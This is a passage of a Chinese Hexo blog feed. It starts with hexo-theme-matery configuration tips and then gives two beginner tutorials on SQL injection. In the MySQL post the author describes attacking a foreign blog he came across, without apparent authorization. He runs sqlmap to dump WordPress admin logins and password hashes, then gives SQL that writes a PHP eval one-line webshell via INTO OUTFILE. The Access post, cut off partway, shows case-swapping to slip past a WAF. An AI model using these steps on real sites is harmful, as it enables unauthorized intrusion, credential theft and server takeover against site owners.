class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-16-添加-RSS-订阅支持（可选的）"><a href="#2-16-添加-RSS-订阅支持（可选的）" class="headerlink" title="2.16 添加 RSS 订阅支持（可选的）"></a>2.16 添加 RSS 订阅支持（可选的）</h4><p>本主题中还使用到了<code>hexo-generator-feed</code>  的 <code>Hexo</code> 插件来做 <code>RSS</code>，安装命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-feed --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 <code>Hexo</code> 根目录下的<code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-bash"><code class="language-bash">feed:  type: atom  path: atom.xml  limit: 20  hub:  content:  content_limit: 140  content_limit_delim: <span class="token string">' '</span>  order_by: -date<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 <code>hexo clean</code> &amp;&amp; <code>hexo g</code> 重新生成博客文件，然后在 <code>public</code> 文件夹中即可看到 <code>atom.xml</code> 文件，说明你已经安装成功了。</p><h4 id="2-17-添加-DaoVoice-在线聊天功能（可选的）"><a href="#2-17-添加-DaoVoice-在线聊天功能（可选的）" class="headerlink" title="2.17 添加 DaoVoice 在线聊天功能（可选的）"></a>2.17 添加 DaoVoice 在线聊天功能（可选的）</h4><p>前往 <code>DaoVoice</code> 官网注册并且获取 <code>app_id</code>，并将 <code>app_id</code> 填入主题的 <code>_config.yml</code> 文件中。</p><h4 id="2-18-添加-Tidio-在线聊天功能（可选的）"><a href="#2-18-添加-Tidio-在线聊天功能（可选的）" class="headerlink" title="2.18 添加 Tidio 在线聊天功能（可选的）"></a>2.18 添加 Tidio 在线聊天功能（可选的）</h4><p>前往 <code>Tidio</code> 官网注册并且获取 <code>Public Key</code>，并将 <code>Public Key</code> 填入主题的 <code>_config.yml</code> 文件中。</p><h4 id="2-19-修改页脚"><a href="#2-19-修改页脚" class="headerlink" title="2.19 修改页脚"></a>2.19 修改页脚</h4><p>页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 <code>/layout/_partial/footer.ejs</code> 文件中，包括站点、使用的主题、访问量等。</p><h4 id="2-20-修改社交链接"><a href="#2-20-修改社交链接" class="headerlink" title="2.20 修改社交链接"></a>2.20 修改社交链接</h4><p>在主题的 <code>_config.yml</code> 文件中，默认支持 <code>QQ</code>、<code>GitHub</code> 和邮箱等的配置，你可以在主题文件的 <code>/layout/_partial/social-link.ejs</code> 文件中，新增、修改你需要的社交链接地址，增加链接可参考如下代码：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.socialLink.github)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> theme.socialLink.github %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>访问我的GitHub<span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fab fa-github<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，社交图标（如：<code>fa-github</code>）你可以在 <code>Font Awesome</code> 中搜索找到。以下是常用社交图标的标识，供你参考：</p><ul><li>Facebook: fab fa-facebook</li><li>Twitter: fab fa-twitter</li><li>Google-plus: fab fa-google-plus</li><li>Linkedin: fab fa-linkedin</li><li>Tumblr: fab fa-tumblr</li><li>Medium: fab fa-medium</li><li>Slack: fab fa-slack</li><li>Sina Weibo: fab fa-weibo</li><li>Wechat: fab fa-weixin</li><li>QQ: fab fa-qq</li><li>Zhihu: fab fa-zhihu</li></ul><p>注意: 本主题中使用的 <code>Font Awesome</code> 版本为 5.11.0。</p><h4 id="2-21-修改打赏的二维码图片"><a href="#2-21-修改打赏的二维码图片" class="headerlink" title="2.21 修改打赏的二维码图片"></a>2.21 修改打赏的二维码图片</h4><p>在主题文件的 <code>source/medias/reward</code> 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。</p><h4 id="2-22-配置音乐播放器（可选的）"><a href="#2-22-配置音乐播放器（可选的）" class="headerlink" title="2.22 配置音乐播放器（可选的）"></a>2.22 配置音乐播放器（可选的）</h4><p>要支持音乐播放，在主题的 <code>_config.yml</code> 配置文件中激活<code>music</code>配置即可</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 是否在首页显示音乐</span>music:  enable: <span class="token boolean">true</span>  title:             <span class="token comment" spellcheck="true">#非吸底模式有效</span>    enable: <span class="token boolean">true</span>    show: 听听音乐  server: netease   <span class="token comment" spellcheck="true">#require music platform: netease, tencent, kugou, xiami, baidu</span>  type: playlist    <span class="token comment" spellcheck="true">#require song, playlist, album, search, artist</span>  id: 503838841     <span class="token comment" spellcheck="true">#require song id / playlist id / album id / search keyword</span>  fixed: <span class="token boolean">false</span>      <span class="token comment" spellcheck="true"># 开启吸底模式</span>  autoplay: <span class="token boolean">false</span>   <span class="token comment" spellcheck="true"># 是否自动播放</span>  theme: <span class="token string">'#42b983'</span>  loop: <span class="token string">'all'</span>       <span class="token comment" spellcheck="true"># 音频循环播放, 可选值: 'all', 'one', 'none'</span>  order: <span class="token string">'random'</span>   <span class="token comment" spellcheck="true"># 音频循环顺序, 可选值: 'list', 'random'</span>  preload: <span class="token string">'auto'</span>   <span class="token comment" spellcheck="true"># 预加载，可选值: 'none', 'metadata', 'auto'</span>  volume: 0.7       <span class="token comment" spellcheck="true"># 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效</span>  listFolded: <span class="token boolean">true</span>  <span class="token comment" spellcheck="true"># 列表默认折叠</span>提示：    server可选netease（网易云音乐），tencent（QQ音乐），kugou（酷狗音乐），xiami（虾米音乐），baidu（百度音乐）。    type可选song（歌曲），playlist（歌单），album（专辑），search（搜索关键字），artist（歌手）    id获取示例: 浏览器打开网易云音乐，点击我喜欢的音乐歌单，地址栏有一串数字，playlist的id即为这串数字。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-23文章-Front-matter-介绍"><a href="#2-23文章-Front-matter-介绍" class="headerlink" title="2.23文章 Front-matter 介绍"></a>2.23文章 Front-matter 介绍</h4><p><code>Front-matter</code> 选项中的所有内容均为非必填的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td>Markdown 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 _config.yml 中的 author</td><td>文章作者</td></tr><tr><td>img</td><td>featureImages 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <a href="http://xxx.com/xxx.jpg" target="_blank" rel="noopener">http://xxx.com/xxx.jpg</a></td></tr><tr><td>top</td><td>true</td><td>推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章</td></tr><tr><td>cover</td><td>false</td><td>v1.0.2版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td>v1.0.2版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项</td></tr><tr><td>toc</td><td>true</td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项</td></tr><tr><td>mathjax</td><td>false</td><td>是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr><tr><td>keywords</td><td>文章标题</td><td>文章关键字，SEO 时需要</td></tr><tr><td>reprintPolicy</td><td>cc_by</td><td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td></tr></tbody></table><pre class="line-numbers language-bash"><code class="language-bash">注意:    如果 img 属性不填写的话，文章特色图会根据文章标题的 hashcode 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图各有特色。    <span class="token function">date</span> 的值尽量保证每篇文章是唯一的，因为本主题中 Gitalk 和 Gitment 识别 <span class="token function">id</span> 是通过 <span class="token function">date</span> 的值来作为唯一标识的。    如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 _config.yml 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：开源中国在线工具、chahuo、站长工具。    您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以下为文章的 <code>Front-matter</code> 示例。<br>最简示例</p><pre class="line-numbers language-bash"><code class="language-bash">---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最全示例</p><pre class="line-numbers language-bash"><code class="language-bash">---title: theme主题介绍date: 2018-09-07 09:25:00author: 赵奇img: /source/images/xxx.jpgtop: <span class="token boolean">true</span>cover: <span class="token boolean">true</span>coverImg: /images/1.jpgpassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc: <span class="token boolean">false</span>mathjax: <span class="token boolean">false</span>summary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories: Markdowntags:  - Typora  - Markdown---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-24-自定制修改"><a href="#2-24-自定制修改" class="headerlink" title="2.24 自定制修改"></a>2.24 自定制修改</h4><p>在本主题的 <code>_config.yml</code> 中可以修改部分自定义信息，有以下几个部分：</p><ul><li>菜单</li><li>我的梦想</li><li>首页的音乐播放器和视频播放器配置</li><li>是否显示推荐文章名称和按钮配置</li><li>favicon 和 Logo</li><li>个人信息</li><li>TOC 目录</li><li>文章打赏信息</li><li>复制文章内容时追加版权信息</li><li>MathJax</li><li>文章字数统计、阅读时长</li><li>点击页面的’爱心’效果</li><li>我的项目</li><li>我的技能</li><li>我的相册</li><li>Gitalk、Gitment、Valine 和 disqus 评论配置</li><li>不蒜子统计和谷歌分析（Google Analytics）</li><li>默认特色图的集合。当文章没有设置特色图时，本主题会根据文章标题的 hashcode 值取余，来选择展示对应的特色图</li></ul><p>我认为个人博客应该都有自己的风格和特色。如果本主题中的诸多功能和主题色彩你不满意，可以在主题中自定义修改，很多更自由的功能和细节点的修改难以在主题的 _config.yml 中完成，需要修改源代码才来完成。以下列出了可能对你有用的地方：<br>修改主题颜色</p><p>在主题文件的 <code>/source/css/matery.css</code> 文件中，搜索 <code>.bg-color</code> 来修改背景颜色：</p><pre class="line-numbers language-css"><code class="language-css"><span class="token comment" spellcheck="true">/* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. */</span><span class="token selector"><span class="token class">.bg-color</span> </span><span class="token punctuation">{</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span>to right, <span class="token hexcode">#4cbf30</span> <span class="token number">0%</span>, <span class="token hexcode">#0f9d58</span> <span class="token number">100%</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token atrule"><span class="token rule">@-webkit-keyframes</span> rainbow</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">/* 动态切换背景颜色. */</span><span class="token punctuation">}</span><span class="token atrule"><span class="token rule">@keyframes</span> rainbow</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/* 动态切换背景颜色. */</span><span class="token punctuation">}</span><span class="token selector">body </span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/* background-color: #eaeaea; */</span>    <span class="token comment" spellcheck="true">/* 增加背景壁纸*/</span>    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url">url("https://ae01.alicdn.com/kf/H18a4b998752a4ae68b8e85d432a5aef0l.png")</span>, <span class="token url">url("http://luckyzmj.cn/img/yun.jpg")</span> <span class="token number">0</span>px <span class="token number">0</span>px<span class="token punctuation">;</span>    <span class="token property">background-attachment</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span>    <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#34495e</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-25-修改-banner-图和文章特色图"><a href="#2-25-修改-banner-图和文章特色图" class="headerlink" title="2.25 修改 banner 图和文章特色图"></a>2.25 修改 banner 图和文章特色图</h4><p>你可以直接在 <code>/source/medias/banner</code> 文件夹中更换你喜欢的 <code>banner</code> 图片，主题代码中是每天动态切换一张，只需 7 张即可。如果你会 <code>JavaScript</code> 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，banner 切换的代码位置在 <code>/layout/_partial/bg-cover-content.ejs</code> 文件的 <code>&lt;script&gt;&lt;/script&gt;</code> 代码中：</p><pre class="line-numbers language-css"><code class="language-css">$<span class="token punctuation">(</span><span class="token string">'.bg-cover'</span><span class="token punctuation">)</span><span class="token number">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'background-image'</span>, <span class="token string">'url(/medias/banner/'</span> + new <span class="token function">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">.</span><span class="token function">getDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> + <span class="token string">'.jpg)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 <code>/source/medias/featureimages</code> 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 <code>_config.yml</code> 做同步修改。</p><h4 id="2-26-优化目录栏"><a href="#2-26-优化目录栏" class="headerlink" title="2.26 优化目录栏"></a>2.26 优化目录栏</h4><p>在 <code>themes\Matery\layout\_partial\post-detail-toc.ejs</code>，修改内容如下：</p><pre class="line-numbers language-css"><code class="language-css"><span class="token selector"><span class="token class">.toc-widget</span> </span><span class="token punctuation">{</span>    <span class="token property">padding-left</span><span class="token punctuation">:</span> <span class="token number">20</span>px<span class="token punctuation">;</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">345</span>px<span class="token punctuation">;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">rgb</span><span class="token punctuation">(</span><span class="token number">255</span>, <span class="token number">255</span>, <span class="token number">255</span>,<span class="token number">0.7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">10</span>px<span class="token punctuation">;</span>    <span class="token property">box-shadow</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">10</span>px <span class="token number">35</span>px <span class="token number">2</span>px <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">.15</span><span class="token punctuation">)</span>, <span class="token number">0</span> <span class="token number">5</span>px <span class="token number">15</span>px <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">.07</span><span class="token punctuation">)</span>, <span class="token number">0</span> <span class="token number">2</span>px <span class="token number">5</span>px -<span class="token number">5</span>px <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">.1</span><span class="token punctuation">)</span> <span class="token important">!important</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token id">#toc-content</span> </span><span class="token punctuation">{</span>    <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token number">20</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x005-更多详细教程"><a href="#0x005-更多详细教程" class="headerlink" title="0x005 更多详细教程"></a>0x005 更多详细教程</h2><p>以下几篇文章都是基于<code>Hexo</code>框架和<code>hexo-theme-matery</code>主题优化的教程，大家如果遇到问题，可以参考其中的方法。</p><ul><li><a href="https://sunhwee.com/posts/6e8839eb.html" target="_blank" rel="noopener">Hexo+Github博客搭建完全教程</a></li><li><a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md" target="_blank" rel="noopener">hexo-theme-matery作者教程</a></li><li><a href="https://yafine-blog.cn/posts/4ab2.html" target="_blank" rel="noopener">Hexo+github搭建博客(超级详细版，精细入微)</a></li><li><a href="https://blog.csdn.net/cungudafa/article/details/106278206" target="_blank" rel="noopener">hexo（matery）背景、滚动条优化+增加点击跳评论</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 博客篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Github </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解新手如何使用sqlmap对mysql数据库进行注入攻击</title>
      <link href="/posts/da637daa.html"/>
      <url>/posts/da637daa.html</url>
      
        <content type="html"><![CDATA[<p><strong>步骤1：发现注入</strong><br>            闲来没事儿在网上瞎逛，无意中点开一个国外的博客，发现链接是以id为结尾的，于是就手工检测了一下，结果嘛…你懂的<br>            <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190308202139799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2019030820230654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">检测页面返回不正常，明显是带入数据库查询了，并且没有WAF，老弟就只好给你上一课啦嘻嘻嘻<br><strong>这里需要注意一下</strong>：<br>mysql跟Access有些不同，mysql数据库里有很多个数据库，我们需要知道网站自己的数据库，以便于得到管理的账号密码，它的结构大体是这样的：<br>            <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190308202537404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><strong>步骤二：使用sqlmap进行注入攻击</strong><br>            首先我们先看一下他的权限，如果是DBA的话可以直接写一句话的，前提是你也要有网站的绝对路径，具体命令在文章最后会写出来。接下来用<br>            sqlmap -u “<a href="http://www.XXXX.com/web/index.php?id=31&quot;" target="_blank" rel="noopener">www.XXXX.com/web/index.php?id=31"</a> –is-dba<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190308203325394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">False，很遗憾并不是，你就只能一步一步来了<br>            接着用sqlmap -u “<a href="http://www.XXX.com/web/index.php?id=31&quot;" target="_blank" rel="noopener">www.XXX.com/web/index.php?id=31"</a> –current-db，爆一下它自己的数据库，一般网站管理的账号密码都在这里面<br>            <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190308214210626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">然后用sqlmap -u “<a href="http://www.XXX.com/web/index.php?id=31&quot;" target="_blank" rel="noopener">www.XXX.com/web/index.php?id=31"</a> –tables -D 数据库名 来爆表名<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190308215420658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">从这里可以看出，后台用的是WordPress，假设我们一开始没有发现注入，我们同样可以用0day来搞它，网站后台的账号密码不出意外应该在uesrs表中，我们用<br>sqlmap -u “<a href="http://www.XXX.com/web/index.php?id=31&quot;" target="_blank" rel="noopener">www.XXX.com/web/index.php?id=31"</a> –columns -T wp_users -D sallatykkaco 来爆列名<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190308221433476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">很明显账号密码在user_login，user_pass这两个列里，然后我们用<br>sqlmap -u “<a href="http://www.XXX.com/web/index.php?id=31&quot;" target="_blank" rel="noopener">www.XXX.com/web/index.php?id=31"</a> –dump -C “user_login,user_pass” -T wp_users -D sallatykkaco 来爆字段名<br>这里提示需要爆破，由于很慢(slow)我们就不在这上面爆破了，拿到网站上去解码<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190308225609320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这个加密形式老弟还是头一回见，这下得好好研究一下了…<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190308230027707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">剩下的常规操作就不在这里一一细说了，进后台，传小马，放大马，拿Shell…<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190308230159594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p> <strong>附加</strong>：<br> mysql是DBA直接写一句话<br> <strong>1、创建一个表</strong><br>create TABLE a (cmd text NOT NULL);<br><strong>2、插入数据</strong><br>insert INTO a (cmd) VALUES(‘<!--?php eval($_POST[hihack]);?-->‘);<br><strong>3、导出一句话</strong><br>select cmd from a into outfile ‘C:\AppServ\www\x.php’;<br><strong>4、删除表</strong><br>Drop TABLE IF EXISTS a;</p><p><strong>成功条件：有读写的权限，有create、insert、select的权限</strong></p><p><strong>注：本文仅供参考学习，请勿在网上搞破坏，触犯法律者应承担相应的法律责任！</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Sqlmap </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解新手如何使用sqlmap对Access数据库进行注入攻击</title>
      <link href="/posts/ec90ea47.html"/>
      <url>/posts/ec90ea47.html</url>
      
        <content type="html"><![CDATA[<p><strong>步骤1：发现是否存在注入</strong></p><p>首先我们打开火狐浏览器，进入目标网站，随意点击几个连接，发现网站后方都是以id参数为结尾的<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190306184329774.png" alt="在这里插入图片描述"><br>看见以id为结尾的，我们第一时间应该想到的就是注入,首先我们输入 and 1=1，发现网站有防sql注入系统<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190306185231505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不要慌，问题不大！打不过我还躲不过？这时候我们尝试进行大小写绕过（绕过WAF的方式与思路很多，在这里就不一一列举了）</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190306185020809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">现在没毛病了8铁汁</p><p>我们接着输入 aNd 1=2，结果提示报错<br><img 